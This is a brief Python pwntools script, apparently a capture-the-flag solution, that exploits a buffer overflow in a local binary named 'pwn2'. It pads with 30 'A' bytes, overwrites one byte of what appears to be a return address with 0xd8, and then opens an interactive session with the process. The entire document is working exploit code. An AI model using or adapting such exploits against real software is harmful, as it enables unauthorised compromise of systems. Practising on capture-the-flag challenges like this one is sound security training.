from pwn import *

e = ELF('./pwn2')
p = process('./pwn2')

payload = 'A'*(0x2a-0xc)
payload += '\xd8'

p.sendline(payload)
p.interactive()